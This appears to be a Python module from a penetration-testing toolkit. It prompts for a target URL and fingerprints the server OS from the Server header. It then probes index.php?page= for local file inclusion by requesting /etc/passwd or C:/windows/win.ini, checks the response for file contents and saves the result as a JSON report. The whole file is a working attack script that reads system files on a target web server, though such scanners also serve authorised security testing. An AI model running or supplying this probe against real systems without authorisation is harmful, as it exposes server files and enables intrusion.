import requests
import json

def init():
    # Asks for target details
    protocol = input("Enter Web Protocol:\n")
    url = input("Enter URL:\n")
    return f"{protocol}://{url}"

def os_checker(target_url):
    # Sends get request for header
    response = requests.get(target_url)
    header = response.headers.get("Server")

    # Win64 only returned for Windows
    if "Win64" in header:
        return "Windows 64-bit", "C:/windows/win.ini"

    # Windows 32-bit header
    elif "Win32" in header:
        return "Windows 32-bit", "C:/windows/win.ini"

    # Linux systems
    elif "Debian" in header or "Ubuntu" in header:
        return "Linux", "/etc/passwd"

def lfi_checker(target_url, target_os, default_file):
    index_path = "index.php?page="
    target_path = target_url + "/" + index_path
    target_file = target_path + default_file

    # Initialize variables for reporting
    lfi_success = False
    proof_snippet = ""

    # Checks for OS to test LFI differently
    if target_os == "Windows 64-bit" or target_os == "Windows 32-bit":
        response = requests.get(target_file)
        page_content = response.text

        if "for 16-bit" in page_content:
            print(f"[+] SUCCESS    -    Windows Machine\n{target_file}")
            lfi_success = True
            proof_snippet = "for 16-bit"
        
    elif target_os == "Linux":
        response = requests.get(target_file)
        page_content = response.text

        if "root:x" in page_content:
            print(f"[+] SUCCESS    -    Linux Machine\n{target_file}")
            lfi_success = True
            proof_snippet = "root:x"

    else:
        print("Targeted OS not supported. Quitting...")

    # Build JSON report
    report = {
        "module": "LFI",
        "target": target_url,
        "os_detected": target_os,
        "vulnerable": lfi_success,
        "payload_used": target_file,
        "proof_snippet": proof_snippet
    }

    # Convert to JSON string
    json_report = json.dumps(report, indent=2)
    with open("LFI.json", "w") as file:
        file.write(json_report)
